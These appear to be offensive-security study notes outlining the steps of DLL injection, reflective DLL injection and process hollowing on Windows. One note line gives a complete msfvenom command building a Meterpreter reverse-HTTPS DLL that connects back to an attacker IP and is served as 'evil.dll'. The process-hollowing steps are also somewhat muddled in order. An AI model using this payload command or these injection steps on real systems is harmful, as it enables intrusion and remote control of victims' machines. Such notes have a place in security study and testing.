Theory / Notes / Code

# DLL Injection 
1. Selecting the Target Process: Choose the process into which you want to inject the DLL. This process is identified by its Process ID (PID).
2. Opening the Target Process: Open the selected process, granting access rights to manipulate its memory and threads.
3. Allocating Memory in the Target Process: Allocate memory within the target process to store the path of the DLL being injected and other necessary data structures.
4. Writing DLL Path to Memory: Write the path of the DLL to be injected into the allocated memory space of the target process.
5. Loading DLL into Target Process: Use the LoadLibrary function to load the DLL into the address space of the target process.
6. Executing DLL Code: The injected DLL code is executed within the context of the target process, performing its intended functionality.
7. Cleaning Up Resources: Release allocated memory and close handles to clean up resources after DLL injection is completed.
<br>
Note: Generated DLLs with msfvenom -p windows/x64/meterpreter/reverse_https LHOHOST=192.168.162.140 LPORT=443 -f dll -o /var/www/html/evil.dll

# Reflective DLL Injection 
1. Downloading the Reflective DLL: Download a reflective DLL from a specified URL or location.
2. Opening the Target Process: Open the target process into which you want to inject the reflective DLL. This process is identified by its Process ID (PID).
3. Allocating Memory in the Target Process: Allocate memory within the target process to store the reflective DLL's code and other necessary data structures.
4. Writing Reflective DLL Code to Memory: Write the reflective DLL's code into the allocated memory space of the target process.
5. Executing Reflective DLL Code: Unlike traditional DLL injection, in reflective DLL injection, the reflective DLL's code is designed to execute itself from memory without relying on the LoadLibrary function. This self-execution is typically achieved by the reflective DLL's ability to parse its own PE header and perform necessary relocations and imports.
6. Executing Reflective Loader: Optionally, a reflective loader may be used to simplify the reflective DLL injection process. The reflective loader is responsible for loading the reflective DLL into memory and executing it, making the injection process more streamlined.
7. Cleaning Up Resources: As with traditional DLL injection, release allocated memory and close handles to clean up resources after reflective DLL injection is completed.

# Process Hollowing
1. Downloading the Legitimate Executable: You download an executable file from a specified URL.
2. Opening the Target Process: You open the process into which you want to inject the executable. This process is identified by its Process ID (PID).
3. Allocating Memory in the Target Process: You allocate memory within the target process to store the executable's code.
4. Writing Executable Content to Memory: You read the contents of the downloaded executable file and write them into the allocated memory space of the target process.
5. Setting Entry Point: You set the entry point of the target process to the starting address of the injected code.
6. Suspending Threads: You suspend all threads within the target process to prevent them from executing.
7. Updating Thread Context: You update the context of the main thread in the target process to set its instruction pointer (EIP) to the entry point of the injected code.
8. Resuming Threads: After updating the thread context, you resume the main thread of the target process, which starts executing the injected code.
9. Cleaning Up Resources: Finally, you release allocated memory and close handles to clean up resources.
